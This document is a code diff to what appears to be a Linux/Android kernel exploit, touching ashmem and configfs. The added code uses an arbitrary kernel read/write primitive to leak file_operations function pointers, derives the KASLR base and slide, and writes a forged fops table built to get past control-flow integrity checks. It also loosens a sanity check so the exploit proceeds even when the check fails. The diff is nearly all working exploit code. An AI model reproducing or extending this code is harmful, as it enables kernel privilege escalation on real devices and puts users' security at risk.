@@ -27,6 +27,83 @@ uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
+static int app_is_kernel_ptr(uintptr_t value) {
+  return value >= 0xffff800000000000ULL;
+}
+
+static int refresh_fake_fops_text(int fd) {
+  struct fops_slot {
+    size_t off;
+    uint64_t value;
+  } slots[] = {
+    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
+    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
+    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
+    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
+    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
+    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
+    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
+    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
+    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
+  };
+
+  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
+    uintptr_t target = fake_fops + slots[i].off;
+    if (kernel_write_data(fd, target, &slots[i].value,
+                          sizeof(slots[i].value)) !=
+        (ssize_t)sizeof(slots[i].value)) {
+      pr_warning("cfi refresh fake fops failed off=%zx errno=%d\n",
+                 slots[i].off, errno);
+      return 0;
+    }
+  }
+  return 1;
+}
+
+static int leak_kernel_base_from_fops(int fd) {
+  uintptr_t fops_alias = p0_data_alias(ASHMEM_FOPS);
+  uint64_t open_ptr = kernel_read64(fd, fops_alias + FOPS_OPEN_OFF);
+  uint64_t ioctl_ptr = kernel_read64(fd, fops_alias + FOPS_IOCTL_OFF);
+  uint64_t mmap_ptr = kernel_read64(fd, fops_alias + FOPS_MMAP_OFF);
+  uint64_t release_ptr = kernel_read64(fd, fops_alias + FOPS_RELEASE_OFF);
+  uint64_t show_fdinfo_ptr =
+      kernel_read64(fd, fops_alias + FOPS_SHOW_FDINFO_OFF);
+  if (!app_is_kernel_ptr(open_ptr) || !app_is_kernel_ptr(ioctl_ptr) ||
+      !app_is_kernel_ptr(mmap_ptr) || !app_is_kernel_ptr(release_ptr) ||
+      !app_is_kernel_ptr(show_fdinfo_ptr)) {
+    pr_warning("cfi kaslr fops pointer leak failed alias=%016zx "
+               "open=%016llx ioctl=%016llx mmap=%016llx "
+               "release=%016llx show=%016llx errno=%d\n",
+               fops_alias, (unsigned long long)open_ptr,
+               (unsigned long long)ioctl_ptr, (unsigned long long)mmap_ptr,
+               (unsigned long long)release_ptr,
+               (unsigned long long)show_fdinfo_ptr, errno);
+    return 0;
+  }
+
+  kaslr_base = open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
+  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  if (ioctl_ptr != text_addr(ASHMEM_IOCTL) ||
+      mmap_ptr != text_addr(ASHMEM_MMAP) ||
+      release_ptr != text_addr(ASHMEM_RELEASE) ||
+      show_fdinfo_ptr != text_addr(ASHMEM_SHOW_FDINFO)) {
+    pr_warning("cfi kaslr fops pointer consistency failed base=%016llx "
+               "ioctl=%016llx/%016llx mmap=%016llx/%016llx\n",
+               (unsigned long long)kaslr_base,
+               (unsigned long long)ioctl_ptr,
+               (unsigned long long)text_addr(ASHMEM_IOCTL),
+               (unsigned long long)mmap_ptr,
+               (unsigned long long)text_addr(ASHMEM_MMAP));
+    kaslr_done = 0;
+    return 0;
+  }
+  pr_success("cfi kaslr from fops base=%016llx slide=%016llx\n",
+             (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
+  return refresh_fake_fops_text(fd);
+}
+
 static int route_delay_usec(int attempt) {
   const char *forced = getenv("PSELECT_DELAY_USEC");
   if (forced && *forced) {
@@ -255,19 +332,15 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = misc_fops_data_addr();
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-    pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
-               "read=%016llx want=%016zx errno=%d\n",
-               pre_rb, misc_fops, (unsigned long long)pre_fops,
-               fake_fops, errno);
-    fops_before = pre_fops;
-    cfi_last_step = 4;
-    cfi_last_errno = errno;
-    goto fail;
+    pr_info("cfi misc_fops precheck note ret=%zd target=%016zx "
+            "read=%016llx want=%016zx errno=%d\n",
+            pre_rb, misc_fops, (unsigned long long)pre_fops,
+            fake_fops, errno);
   }
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
@@ -305,6 +378,11 @@ int try_cfi_stage(void) {
   }
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!leak_kernel_base_from_fops(fd)) {
+    cfi_last_step = 9;
+    cfi_last_errno = errno;
+    goto fail;
+  }
   if (!restore_p0_oracle_pages(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
